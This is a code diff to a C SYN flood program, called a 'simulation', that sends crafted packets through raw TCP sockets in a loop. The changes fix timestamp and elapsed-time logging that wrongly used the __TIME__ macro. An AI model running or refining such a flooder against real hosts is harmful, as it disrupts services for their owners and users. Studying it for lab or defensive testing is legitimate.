@@ -7,6 +7,7 @@
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
 #include <unistd.h>
+#include <sys/time.h>
 
 // Pseudo header needed for checksum calculation
 struct pseudo_header {
@@ -62,9 +63,16 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
     
-    fprintf(log_file, "\n--- SYN Flood Simulation Started at %s ---\n", __TIME__);
+    // Get current time as a formatted string
+    time_t now = time(NULL);
+    char time_str[64];
+    strftime(time_str, sizeof(time_str), "%H:%M:%S", localtime(&now));
+    
+    fprintf(log_file, "\n--- SYN Flood Simulation Started at %s ---\n", time_str);
 
-    double time_start = __TIME__;
+    // Use a proper timer for elapsed time calculation
+    struct timeval start_time;
+    gettimeofday(&start_time, NULL);
     
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (s < 0) {
@@ -140,8 +148,14 @@ int main(int argc, char *argv[]) {
         if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             perror("sendto failed");
         } else {
+            // Calculate elapsed time
+            struct timeval current_time;
+            gettimeofday(&current_time, NULL);
+            double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
+                             (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
+            
             // Log sent packet details
-            fprintf(log_file, "SEQ = %d TTL[%f]\n", i + 1, __TIME__ - time_start);
+            fprintf(log_file, "SEQ = %d TTL[%f]\n", i + 1, elapsed);
             printf("Packet %d sent from %s\n", i + 1, src_ip);
         }
 
@@ -149,7 +163,12 @@ int main(int argc, char *argv[]) {
         // usleep(1000);
     }
 
-    fprintf(log_file, "--- SYN Flood Simulation Ended at %s ---\n", __TIME__);
+    // Get end time
+    time_t end_now = time(NULL);
+    char end_time_str[64];
+    strftime(end_time_str, sizeof(end_time_str), "%H:%M:%S", localtime(&end_now));
+    
+    fprintf(log_file, "--- SYN Flood Simulation Ended at %s ---\n", end_time_str);
 
     // Close log file and socket
     fclose(log_file);
